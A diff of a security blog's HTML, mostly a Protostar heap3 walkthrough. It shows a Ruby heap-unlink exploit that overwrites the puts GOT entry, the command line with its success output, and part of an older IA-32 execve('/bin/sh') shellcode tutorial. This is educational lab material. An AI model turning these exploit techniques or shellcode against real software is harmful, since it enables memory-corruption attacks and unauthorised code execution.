+</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">prevsz</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">prevsz</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>     <span class="cm">/* keep as last_remainder */</span>
+</span><span class='line'>      <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>      <span class="nf">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">)))</span>   <span class="cm">/* consolidate forward */</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">nextsz</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">islr</span> <span class="o">&amp;&amp;</span> <span class="n">next</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>
+</span><span class='line'>                                              <span class="cm">/* re-insert last_remainder */</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>      <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">link_last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>      <span class="n">unlink</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">next</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>    <span class="n">set_head</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">);</span>                  <span class="cm">/* clear inuse bit */</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To call vulnerable <code>unlink()</code>, we have two branches, consolidate backward or consolidate forward.</p>
+
+<p>We want to overwrite the jump to <code>printf/puts</code> function in <code>GOT</code> table with
+the address of <code>winner()</code>.</p>
+
+<p>Given the <code>bck</code> and <code>fwd</code> pointers that we could set arbitrary, <code>free()</code> will do <code>*(fwd+12) = bck</code>
+and <code>*(bck+8) = fwd</code>. We use the first assignment to write to the arbitrary memory location.</p>
+
+<p>Because the second assignment, we cannot simply write something to <code>.text</code> section (after <code>winner+0x8</code>),
+but jumping to our shellcode stored in allocated memory would be efficient.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb> print /x 0x08048864+0x8
+</span><span class='line'>$1 = 0x804886c
+</span><span class='line'>
+</span><span class='line'>gdb> maintenance info sections 
+</span><span class='line'>Exec file:
+</span><span class='line'>    `/opt/protostar/bin/heap3', file type elf32-i386.
+</span><span class='line'>    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x804816c->0x8048234 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x8048234->0x804829c at 0x00000234: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x804829c->0x804848c at 0x0000029c: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x804848c->0x804859a at 0x0000048c: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x804859a->0x80485d8 at 0x0000059a: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x80485d8->0x80485f8 at 0x000005d8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x80485f8->0x8048608 at 0x000005f8: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x8048608->0x8048680 at 0x00000608: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x8048680->0x80486b0 at 0x00000680: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
+</span><span class='line'>    0x80486b0->0x80487b0 at 0x000006b0: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
+</span><span class='line'>==> 0x80487b0->0x804abdc at 0x000007b0: .text ALLOC LOAD READONLY CODE HAS_CONTENTS &lt;==
+</span><span class='line'>    0x804abdc->0x804abf8 at 0x00002bdc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
+</span><span class='line'>    0x804abf8->0x804aca0 at 0x00002bf8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x804aca0->0x804aca4 at 0x00002ca0: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
+</span><span class='line'>    0x804b000->0x804b008 at 0x00003000: .ctors ALLOC LOAD DATA HAS_CONTENTS
+</span><span class='line'>    0x804b008->0x804b010 at 0x00003008: .dtors ALLOC LOAD DATA HAS_CONTENTS
+</span><span class='line'>    0x804b010->0x804b014 at 0x00003010: .jcr ALLOC LOAD DATA HAS_CONTENTS
+</span><span class='line'>    0x804b014->0x804b0e4 at 0x00003014: .dynamic ALLOC LOAD DATA HAS_CONTENTS
+</span><span class='line'>    0x804b0e4->0x804b0e8 at 0x000030e4: .got ALLOC LOAD DATA HAS_CONTENTS
+</span><span class='line'>    0x804b0e8->0x804b130 at 0x000030e8: .got.plt ALLOC LOAD DATA HAS_CONTENTS
+</span><span class='line'>    0x804b130->0x804b138 at 0x00003130: .data ALLOC LOAD DATA HAS_CONTENTS
+</span><span class='line'>    0x804b140->0x804b5d4 at 0x00003138: .bss ALLOC
+</span><span class='line'>    0x0000->0x3cfc at 0x00003138: .stab READONLY HAS_CONTENTS
+</span><span class='line'>    0x0000->0x566a at 0x00006e34: .stabstr READONLY HAS_CONTENTS
+</span><span class='line'>    0x0000->0x0039 at 0x0000c49e: .comment READONLY HAS_CONTENTS</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exploit:</p>
+
+<figure class='code'><figcaption><span>exploit-backward.rb </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># user@protostar:~$ objdump -d /opt/protostar/bin/heap3 -M intel</span>
+</span><span class='line'><span class="c1"># ...</span>
+</span><span class='line'><span class="c1">#  8048935:       e8 56 fe ff ff          call   8048790 &lt;puts@plt&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># user@protostar:~$ objdump -TR /opt/protostar/bin/heap3 | grep &quot;R_386_JUMP_SLOT.* puts&quot;</span>
+</span><span class='line'><span class="c1"># 0804b128 R_386_JUMP_SLOT   puts</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># gdb&gt; print /x 0x0804b128-0x0c</span>
+</span><span class='line'><span class="c1"># $1 = 0x804b11c</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># user@protostar:~$ nm /opt/protostar/bin/heap3 | grep winner</span>
+</span><span class='line'><span class="c1"># 08048864 T winner</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># root@kali32:~# rasm2 -C &#39;push 0x08048864; ret&#39;</span>
+</span><span class='line'><span class="c1"># &quot;\x68\x64\x88\x04\x08\xc3&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># user@protostar:/tmp$ ltrace -e strcpy /opt/protostar/bin/heap3 a b c</span>
+</span><span class='line'><span class="c1"># strcpy(0x0804c008, &quot;a&quot;)                              = 0x0804c008</span>
+</span><span class='line'><span class="c1"># strcpy(0x0804c030, &quot;b&quot;)                              = 0x0804c030</span>
+</span><span class='line'><span class="c1"># strcpy(0x0804c058, &quot;c&quot;)                              = 0x0804c058</span>
+</span><span class='line'><span class="c1"># gdb&gt; print /x 0x0804c008 + 0x04</span>
+</span><span class='line'><span class="c1"># $1 = 0x804c00c</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;/opt/protostar/bin/heap3&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># chunk1</span>
+</span><span class='line'><span class="n">argv1</span>  <span class="o">=</span> <span class="s2">&quot;XXXX&quot;</span>                        <span class="c1"># user data, later overwritten by second free()</span>
+</span><span class='line'><span class="n">argv1</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\x68\x64\x88\x04\x08\xc3</span><span class="s2">&quot;</span>    <span class="c1"># shellcode</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># chunk2</span>
+</span><span class='line'><span class="n">argv2</span>  <span class="o">=</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;ABCDEFG&quot;</span> <span class="c1"># user data</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># chunk3</span>
+</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0xfffffff8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># prev_size = -8 &amp;&amp; PREV_INUSE = 0</span>
+</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0xfffffffc</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># size = -4</span>
+</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x44444444</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># prev_size(unused) for fake chunk </span>
+</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x45454545</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># size(unused) for fake chunk</span>
+</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x0804b11c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># ret_loc-0x0c</span>
+</span><span class='line'><span class="n">argv2</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x0804c00c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>        <span class="c1"># ret_addr</span>
+</span><span class='line'><span class="n">argv3</span>  <span class="o">=</span> <span class="s2">&quot;X&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># *(0x0804b11c+12) = 0x0804c00c; *(0x0804c00c+8) = 0x0804b11c</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">puts</span> <span class="sx">%x[ </span><span class="si">#{</span><span class="n">binary</span><span class="si">}</span><span class="sx"> &quot;</span><span class="si">#{</span><span class="n">argv1</span><span class="si">}</span><span class="sx">&quot; &quot;</span><span class="si">#{</span><span class="n">argv2</span><span class="si">}</span><span class="sx">&quot; &quot;</span><span class="si">#{</span><span class="n">argv3</span><span class="si">}</span><span class="sx">&quot; ]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To explain the logic behind our code, because <code>size</code> has the lowest bit set as
+<code>!PREV_INUSE</code> and <code>p</code> points to the beginning of our current chunk, we
+triggered the following part of pseudocode with the first <code>free()</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="cm">/* consolidate backward */</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="o">-</span><span class="mi">8</span>
+</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">+</span><span class="mi">8</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here the address of &ldquo;virtual chunk&rdquo; was computed and unlinked:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">[</span><span class="mh">0x44444444</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># prev_size</span>
+</span><span class='line'><span class="o">[</span><span class="mh">0x45454545</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># size</span>
+</span><span class='line'><span class="o">[</span><span class="mh">0x0804b11c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># fwd</span>
+</span><span class='line'><span class="o">[</span><span class="mh">0x0804c00c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="c1"># bck</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, there is another test in consolidate forward:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
+</span><span class='line'>    unlink(next, bck, fwd);
+</span><span class='line'>
+</span><span class='line'>0x08049918 &lt;free+244>: mov    eax,DWORD PTR [ebp-0x24] ; eax:FFFFFFF8 = -8
+</span><span class='line'>0x0804991b &lt;free+247>: mov    edx,DWORD PTR [ebp-0x28] ; 0x804c04c: "DEFG\370\377\377\377\374\377\377\377X"
+</span><span class='line'>0x0804991e &lt;free+250>: lea    eax,[edx+eax*1]          ; 0x804c044: "XXXX\001ABCDEFG\370\377\377\377\374\377\377\377X"
+</span><span class='line'>0x08049921 &lt;free+253>: mov    eax,DWORD PTR [eax+0x4]  ; eax:43424101
+</span><span class='line'>0x08049924 &lt;free+256>: and    eax,0x1                  ; eax:00000001 = PREV_INUSE flag
+</span><span class='line'>0x08049927 &lt;free+259>: mov    DWORD PTR [ebp-0x20],eax ; 
+</span><span class='line'>0x0804992a &lt;free+262>: mov    eax,DWORD PTR [ebp-0x28] ; 0x804c04c: "DEFG\370\377\377\377\374\377\377\377X"
+</span><span class='line'>0x0804992d &lt;free+265>: mov    edx,DWORD PTR [ebp-0x24] ; edx:FFFFFFF8
+</span><span class='line'>0x08049930 &lt;free+268>: mov    DWORD PTR [eax+0x4],edx  
+</span><span class='line'>0x08049933 &lt;free+271>: cmp    DWORD PTR [ebp-0x20],0x0 ; PREV_INUSE set?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we are verifying, if the <code>PREV_INUSE</code> flag is set <code>(0x43424101)</code>, so we
+skipped the forward consolidation:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">argv2</span>  <span class="o">=</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;ABCDEFG&quot;</span> <span class="c1"># user data</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ /opt/protostar/bin/heap3 $(ruby -e 'print "XXXX" + "\x68\x64\x88\x04\x08\xc3"') $(ruby -e 'print "X" * 24 + "\x01" + "ABCDEFG" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + [0x0804b11c].pack("V") + [0x0804c00c].pack("V")') X
+</span><span class='line'>that wasn't too bad now, was it? @ 1435304932
+</span><span class='line'>
+</span><span class='line'>user@protostar:/tmp$ ./exploit-backward.rb 
+</span><span class='line'>that wasn't too bad now, was it? @ 1435304818</span></code></pre></td></tr></table></div></figure>
+
+
+<hr />
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -2147,615 +3548,6 @@ find <code>call eax</code> instruction addresses in code and use one of them.</p
 </span><span class='line'>                                       ̀XXXXXXXXXXXXXXXXXXXXXXXXX?XXXXXXXXXXXX??
 </span><span class='line'>id
 </span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>
-
-
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/26/ia-32-linux-shellcode-basics-2/">IA-32 Linux Shellcode Basics 2</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-26T11:08:30+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:08 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Starting with the ASM code that is position dependent:</p>
-
-<figure class='code'><figcaption><span>shell1.asm </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
-</span><span class='line'><span class="nf">cmd</span> <span class="no">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0x0</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
-</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
-</span><span class='line'><span class="nl">_start:</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">11</span>
-</span><span class='line'><span class="nf">lea</span> <span class="no">ebx</span><span class="p">,</span> <span class="err">[</span><span class="no">cmd</span><span class="err">]</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">ecx</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell1.asm; ld shell1.o -o shell1
-</span><span class='line'>
-</span><span class='line'>root@kali32:/tmp# ./shell1 
-</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell1
-</span><span class='line'>
-</span><span class='line'>shell1:     file format elf32-i386
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Disassembly of section .text:
-</span><span class='line'>
-</span><span class='line'>08048080 &lt;_start>:
-</span><span class='line'> 8048080: b8 0b 00 00 00          mov    eax,0xb
-</span><span class='line'> 8048085: 8d 1d 9c 90 04 08       lea    ebx,ds:0x804909c
-</span><span class='line'> 804808b: b9 00 00 00 00          mov    ecx,0x0
-</span><span class='line'> 8048090: 51                      push   ecx
-</span><span class='line'> 8048091: 53                      push   ebx
-</span><span class='line'> 8048092: 89 e1                   mov    ecx,esp
-</span><span class='line'> 8048094: ba 00 00 00 00          mov    edx,0x0
-</span><span class='line'> 8048099: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The minimalistic shell could look like <code>execve("/bin/sh", NULL, NULL)</code>.
-However, according documentation it&rsquo;s not portable among UNIX systems:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 execve
-</span><span class='line'>
-</span><span class='line'>  On Linux, argv can be specified as NULL, which has the same effect as
-</span><span class='line'>  specifying this argument as a pointer to a list containing a single NULL
-</span><span class='line'>  pointer.  Do not take advantage of this  misfea‐ ture!  It is nonstandard and
-</span><span class='line'>  nonportable: on most other UNIX systems doing this will result in an error
-</span><span class='line'>  (EFAULT).</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Again, the same procedure. We need to get rid of absolute address reference and
-NULL bytes.</p>
-
-<figure class='code'><figcaption><span>shell2.asm </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
-</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
-</span><span class='line'><span class="nl">_start:</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
-</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
-</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
